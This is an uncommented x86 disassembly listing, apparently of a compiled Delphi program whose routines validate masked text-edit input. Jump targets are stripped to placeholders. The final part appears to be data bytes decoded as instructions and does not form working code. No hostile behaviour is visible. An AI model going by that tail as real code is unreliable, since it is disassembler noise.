mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_45f79c
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_45f79c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4615e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4617a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_404034
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_4042a0
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_45f700
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_4042a0
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_4042a0
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_4042a0
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_404500
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
call sub_404500
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_4042ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4617ad
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404004
retn
mov eax [ esi ]
call sub_4042a0
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_4042a0
mov edx eax
dec edx
mov eax esi
call sub_40462c
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_4042a0
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_404500
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_45f5ac
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_4044ac
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_4617b4
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_45fb88
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_45f5ac
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_461948
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_462028
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_45fb34
mov edi eax
mov edx edi
mov eax esi
call sub_4609f0
jmp r-xdata
sub_461868
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_461936
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_45fb34
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_4042a0
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_402a44
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_402a44
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_4604b8
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40be44
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_4604b8
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40be44
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46193d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
sub_461948
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_461bfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_45f5ac
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_45f700
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_45f77c
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461c01
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_404004
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404078
lea eax [ ebp - 0x10 ]
call j_sub_4044ac
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_461850
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_461868
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_461868
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404078
lea eax [ ebp - 0x10 ]
call j_sub_4044ac
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_407d08
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_404078
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_407d08
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_404078
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_407d3c
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_404078
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_407d3c
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_404078
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_461c0f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_4042a0
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_45f5ac
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_461ccc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_45fb88
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_4042a0
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_4044ac
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_45f5ac
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_461d64
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_462014
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46201b
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_404004
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_404078
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_45fb88
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_4042a0
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_45f5ac
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_4042a0
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_461948
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40be44
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4042a0
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40be44
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404500
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404500
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4042ec
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404500
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4042a0
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_4042a0
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_404500
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404360
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_4041c8
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_4042a8
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_4044ac
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_4044ac
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_4042a0
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404500
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_4041c8
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4042a0
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_404500
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404360
inc edi
sub_462028
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_4042a0
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_45f5ac
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_45f77c
mov edx eax
mov ebp edi
jmp r-xdata
sub_462084
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4620a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4620b0
retn
sub_4620c0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx ] ah
inc esi
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x766e4945 ] dl
popad
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x704f6469
jb r-xdata
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add ah ch
cmp eax [ esi ]
xchg esp eax
dec edi
inc esp
add [ eax - 0x3ffbbac ] dh
je r-xdata
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add al ch
dec edx
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x3bec0041 ] bh
inc esi
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
outsd
outsb
mov eax eax
insb
and [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ edx ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x22 ] dh
inc esi
add [ esi + 0x48004622 ] ch
add al [ eax ]
add [ eax ] dl
add [ esi ] al
pushfd
fwait
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add [ eax ] bl
push ecx
inc ebx
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
add [ eax + 0x3000441c ] ch
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add al cl
dec edx
inc ebx
add [ esp + ecx * 2 ] al
inc ebx
add al al
dec ebx
inc ebx
add [ eax + 0x3400434d ] cl
dec esp
inc ebx
add ah ah
dec ebx
inc ebx
add [ eax - 0x13ffb9f4 ] ah
dec esp
inc ebx
add [ eax ] bh
cmp eax 0xcac0046
inc esi
add [ eax ] bl
sbb al 0x46
add [ ebp + edx + 0x46 ] bl
add [ esp + edx + 0x44600046 ] bh
inc esi
add al cl
inc esp
inc esi
add [ edx ] cl
add [ ecx ] bl
mov al 0x87
add [ edx ] al
add eax [ eax ]
add eax [ ebx ]
add ebp ecx
jmp edx
inc esp
add ah dh
dec edi
inc ebx
add [ ecx + ecx * 2 + 0x44 ] bh
add [ edx + eax * 2 ] ch
inc esi
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ esp + edi + 0x46 ] cl
add al ah
dec esi
inc ebx
add [ eax + 0x4f ] dl
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
sub_462a21
push [ ebx + ebx * 4 + 0x46 ]
add [ ebx + ebx * 4 - 0x642bffba ] dl
inc esi
add [ esp + ebx * 4 ] dl
inc esi
add [ esp + ebx * 4 + 0x46 ] ah
add [ eax ] dh
popfd
inc esi
add [ edi ] cl
push esp
inc ebx
jne r-xdata
inc esp
je r-xdata
inc esp
add [ ebx + 0x497c0044 ] al
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
loopne r-xdata
insd
inc esp
jb r-xdata
pop ebx
add [ eax ] al
jmp [ eax - 0x2a ]
add [ eax ] dh
dec edx
inc esi
add [ eax + 0x3400469c ] dl
pushfd
inc esi
add al bh
inc esp
add ah bl
inc sp
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax + 0x4004655 ] dh
pushad
inc esi
add al ah
jl r-xdata
add [ ebx + 0x44 ] bh
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add al dh
jl r-xdata
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ ebp + eax * 2 + 0x4f940046 ] al
inc esp
add [ eax - 0x3ffbbac ] dh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
aam 0x46
inc eax
ja r-xdata
add [ edi ] al
inc ecx
ja r-xdata
cdq
inc esi
add [ edx + ebx * 4 ] bl
inc esi
add [ ecx ] cl
push esp
inc esp
jb r-xdata
add al dh
sbb al [ eax + eax + 0x20 ]
sbb [ eax + eax - 0x60 ] eax
push ds
inc esp
add [ esi + ebx + 0x1d5c0044 ] ah
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
and al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x2b
inc esi
add al bl
jb r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x11000000 ] 0x0
or [ ebx + 0x6f ] al
insb
inc ebx
outsd
jne r-xdata
inc eax
adc [ ecx ] al
pop edi
add [ eax ] al
push [ eax ]
pop [ ebx ]
popad
add [ eax ] al
jmp [ eax + 0x3c0043d4 ]
jb r-xdata
mov eax eax
push eax
sub al [ esi ]
pop es
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
je r-xdata
je r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax + 0x3 ] al
or eax 0x6e410700
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ edi ] bl
add bh bh
jo r-xdata
mov eax eax
mov eax 0x700462b
or [ esp + eax * 2 + 0x72 ] edx
popad
ja r-xdata
add [ edx + eax ] bh
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
outsd
insd
inc esp
jb r-xdata
hlt
cmp al 0x10
inc eax
add [ edx + eax ] dh
add bh bh
push 0x100468e
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
pop [ ebx ]
je r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
add dh bh
jo r-xdata
jb r-xdata
inc esi
add [ eax + 0x8004454 ] al
dec ebp
inc esi
add [ eax ] dh
inc esi
ja r-xdata
add [ eax ] al
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
je r-xdata
outsb
jae r-xdata
add bh bh
push esp
push es
inc esp
ja r-xdata
jb r-xdata
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd065646f
inc ebp
add [ eax ] bl
add al [ eax ]
call [ eax ]
lea eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
str [ ebx ]
inc edx
outsd
jb r-xdata
add [ eax ] al
shr [ fs : edx ] 0x46
add [ edx + ebp + 0x46 ] cl
add [ ecx ] cl
add eax 0x64697247
jae r-xdata
xor al 0x40
jb r-xdata
jb r-xdata
outsd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
insb
nop
stosb [ edi ]
inc ecx
add [ eax ] dh
add bh bh
in al dx
loop r-xdata
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul esp [ gs : edi + 0x68 ] 0x40100074
add [ edx + eax + 0x28cff00 ] cl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push ss
sbb [ eax ] 0x0
add [ eax ] al
adc eax 0x65441000
popa
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x5700ffff ] ah
dec edx
inc esp
add ah cl
dec edx
outsb
add ah ah
xchg [ ebx ] eax
inc eax
inc ecx
sub al 0x29
inc esi
add [ edi + 0xc0046 ] al
add eax 0x64697247
jae r-xdata
mov es [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xfffff1 ] al
sbb eax [ eax ]
or al [ esi + 0x69 ]
js r-xdata
outsd
add [ esi ] cl
inc esp
popa
jne r-xdata
add [ eax ] al
add [ esi ] dl
xor eax [ esp + edi + 0x10 ]
inc eax
add [ eax ] dh
add al [ eax ]
[ esi + ecx * 4 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] cl
jecxz r-xdata
jmp [ esi + ecx * 4 + 0x10046 ]
